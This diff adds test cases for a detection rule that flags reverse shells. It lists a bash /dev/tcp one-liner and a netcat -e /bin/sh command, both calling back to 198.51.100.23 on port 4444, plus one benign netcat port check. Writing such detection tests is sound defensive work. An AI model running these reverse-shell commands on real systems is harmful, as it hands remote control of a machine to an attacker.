@@ -1,0 +1,17 @@
+rule_id: 62290bbc-85cf-459a-a8b8-85538fff061d
+cases:
+  - name: bash /dev/tcp one-liner
+    expect: match
+    event:
+      Image: '/usr/bin/bash'
+      CommandLine: 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1'
+  - name: netcat -e /bin/sh
+    expect: match
+    event:
+      Image: '/usr/bin/nc'
+      CommandLine: 'nc 198.51.100.23 4444 -e /bin/sh'
+  - name: netcat port check
+    expect: no_match
+    event:
+      Image: '/usr/bin/nc'
+      CommandLine: 'nc -zv db01 5432'
